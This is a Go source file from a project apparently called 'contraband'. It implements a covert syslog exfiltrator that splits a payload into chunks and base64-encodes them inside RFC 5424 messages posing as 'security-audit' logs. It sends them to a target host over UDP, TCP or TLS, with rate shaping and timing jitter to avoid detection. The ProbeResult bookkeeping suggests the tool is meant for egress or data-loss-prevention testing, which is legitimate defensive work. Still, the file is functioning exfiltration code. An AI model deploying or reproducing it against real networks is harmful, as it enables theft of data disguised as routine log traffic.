package covert

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoSyslog, NewSyslogExfiltrator())
}

// SyslogExfiltrator implements RFC 5424 structured syslog exfiltration over UDP, TCP, and TLS.
type SyslogExfiltrator struct{}

func NewSyslogExfiltrator() *SyslogExfiltrator {
	return &SyslogExfiltrator{}
}

func (e *SyslogExfiltrator) Protocol() string {
	return common.ProtoSyslog
}

// BuildRFC5424Message formats an RFC 5424 structured syslog message containing exfiltrated chunk data.
func BuildRFC5424Message(token common.SessionToken, seq, total int, hash string, payload []byte) string {
	now := time.Now().UTC().Format(time.RFC3339Nano)
	hostname := "sec-node01"
	appname := "security-audit"
	procID := "4028"
	msgID := "CTRB-EXFIL"
	b64Payload := base64.StdEncoding.EncodeToString(payload)

	// RFC 5424 Format: <PRI>VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID [SD-ELEMENT] MSG
	// PRI 14 = Facility 1 (User-level) * 8 + Severity 6 (Informational)
	return fmt.Sprintf("<14>1 %s %s %s %s %s [ctrb@32473 token=\"%s\" seq=\"%d\" total=\"%d\" hash=\"%s\"] %s",
		now, hostname, appname, procID, msgID, token.String(), seq, total, hash, b64Payload)
}

func (e *SyslogExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunks, err := evasion.ChunkPayload(payload, opts.SessionToken, opts.ChunkSize)
	if err != nil {
		return nil, fmt.Errorf("failed to chunk payload: %w", err)
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	transport := strings.ToLower(opts.Headers["transport"])
	if transport == "" {
		if opts.UseTLS || opts.TargetPort == 6514 {
			transport = "tls"
		} else if opts.TargetPort == 514 {
			transport = "udp"
		} else {
			transport = "tcp"
		}
	}

	totalChunks := len(chunks)
	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	switch transport {
	case "tls":
		tlsConf := &tls.Config{
			ServerName:         opts.TargetHost,
			InsecureSkipVerify: opts.InsecureTLS,
		}
		d := &net.Dialer{Timeout: opts.Timeout}
		conn, dialErr := tls.DialWithDialer(d, "tcp", targetAddr, tlsConf)
		if dialErr != nil {
			result.Verdict = classifyCovertError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateCovertDurations(&result)
			return &result, dialErr
		}
		defer conn.Close()

		result.Timestamps.HandshakeTLS = time.Now().UTC()

		for i, chunkFrame := range chunks {
			seq := i + 1
			if opts.Shaper != nil {
				if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
					result.Verdict = classifyCovertError(err)
					result.ErrorMessage = err.Error()
					calculateCovertDurations(&result)
					return &result, err
				}
			}
			if opts.Cadence != nil {
				delay := opts.Cadence.NextDelay()
				if delay > 0 {
					select {
					case <-time.After(delay):
					case <-ctx.Done():
						result.Verdict = classifyCovertError(ctx.Err())
						result.ErrorMessage = ctx.Err().Error()
						calculateCovertDurations(&result)
						return &result, ctx.Err()
					}
				}
			}

			msg := BuildRFC5424Message(opts.SessionToken, seq, totalChunks, opts.ExpectedHash, chunkFrame)
			// RFC 6587 octet counting
			framed := fmt.Sprintf("%d %s\n", len(msg), msg)
			if _, err := conn.Write([]byte(framed)); err != nil {
				result.Verdict = classifyCovertError(err)
				result.ErrorMessage = err.Error()
				calculateCovertDurations(&result)
				return &result, err
			}
			result.BytesSent += int64(len(framed))
		}

	case "tcp":
		d := net.Dialer{Timeout: opts.Timeout}
		conn, dialErr := d.DialContext(ctx, "tcp", targetAddr)
		if dialErr != nil {
			result.Verdict = classifyCovertError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateCovertDurations(&result)
			return &result, dialErr
		}
		defer conn.Close()

		for i, chunkFrame := range chunks {
			seq := i + 1
			if opts.Shaper != nil {
				if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
					result.Verdict = classifyCovertError(err)
					result.ErrorMessage = err.Error()
					calculateCovertDurations(&result)
					return &result, err
				}
			}
			if opts.Cadence != nil {
				delay := opts.Cadence.NextDelay()
				if delay > 0 {
					select {
					case <-time.After(delay):
					case <-ctx.Done():
						result.Verdict = classifyCovertError(ctx.Err())
						result.ErrorMessage = ctx.Err().Error()
						calculateCovertDurations(&result)
						return &result, ctx.Err()
					}
				}
			}

			msg := BuildRFC5424Message(opts.SessionToken, seq, totalChunks, opts.ExpectedHash, chunkFrame)
			framed := fmt.Sprintf("%d %s\n", len(msg), msg)
			if _, err := conn.Write([]byte(framed)); err != nil {
				result.Verdict = classifyCovertError(err)
				result.ErrorMessage = err.Error()
				calculateCovertDurations(&result)
				return &result, err
			}
			result.BytesSent += int64(len(framed))
		}

	default: // "udp"
		udpAddr, resErr := net.ResolveUDPAddr("udp", targetAddr)
		if resErr != nil {
			result.Verdict = classifyCovertError(resErr)
			result.ErrorMessage = resErr.Error()
			calculateCovertDurations(&result)
			return &result, resErr
		}
		conn, dialErr := net.DialUDP("udp", nil, udpAddr)
		if dialErr != nil {
			result.Verdict = classifyCovertError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateCovertDurations(&result)
			return &result, dialErr
		}
		defer conn.Close()

		for i, chunkFrame := range chunks {
			seq := i + 1
			if opts.Shaper != nil {
				if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
					result.Verdict = classifyCovertError(err)
					result.ErrorMessage = err.Error()
					calculateCovertDurations(&result)
					return &result, err
				}
			}
			if opts.Cadence != nil {
				delay := opts.Cadence.NextDelay()
				if delay > 0 {
					select {
					case <-time.After(delay):
					case <-ctx.Done():
						result.Verdict = classifyCovertError(ctx.Err())
						result.ErrorMessage = ctx.Err().Error()
						calculateCovertDurations(&result)
						return &result, ctx.Err()
					}
				}
			}

			msg := BuildRFC5424Message(opts.SessionToken, seq, totalChunks, opts.ExpectedHash, chunkFrame)
			if _, err := conn.Write([]byte(msg)); err != nil {
				result.Verdict = classifyCovertError(err)
				result.ErrorMessage = err.Error()
				calculateCovertDurations(&result)
				return &result, err
			}
			result.BytesSent += int64(len(msg))
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)
	calculateCovertDurations(&result)

	return &result, nil
}
